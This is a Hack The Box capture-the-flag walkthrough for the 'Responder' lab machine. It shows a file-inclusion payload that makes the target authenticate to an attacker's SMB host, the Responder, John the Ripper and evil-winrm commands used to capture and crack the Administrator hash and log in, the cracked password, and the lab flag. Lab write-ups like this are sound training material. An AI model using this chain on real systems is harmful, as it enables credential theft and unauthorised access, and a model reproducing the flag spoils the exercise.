# Responder - HTB Walkthrough

## Summary
Responder is a "Very Easy" Windows machine from the HTB Starting Point. It focuses on Local/Remote File Inclusion (LFI/RFI) vulnerabilities and NTLM hash capturing/cracking.

## Enumeration
- **Target IP**: 10.129.95.234
- **Domain**: `unika.htb` (Found via redirection from IP)
- **Open Ports**: 
  - 80 (Apache/PHP)
  - 5985 (WinRM)

## Vulnerability
The `page` parameter on `index.php` (e.g., `index.php?page=french.html`) is vulnerable to file inclusion.

## Exploitation
1. **Capture Hash**:
   - Start Responder: `sudo responder -I tun0`
   - Trigger SMB authentication: `http://unika.htb/index.php?page=//[YOUR_IP]/test`
   - Captured **NetNTLMv2** hash for user `Administrator`.

2. **Crack Hash**:
   - Tool: **John the Ripper**
   - Wordlist: `rockyou.txt`
   - Command: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
   - Result: **`badminton`**

3. **Remote Access**:
   - Service: **WinRM** (Port 5985)
   - Tool: `evil-winrm`
   - Command: `evil-winrm -i 10.129.95.234 -u Administrator -p badminton`

## Flags
- **mike's flag**: `ea81b7afddd03efaa0945333ed147fac` (Location: `C:\Users\mike\Desktop\flag.txt`)
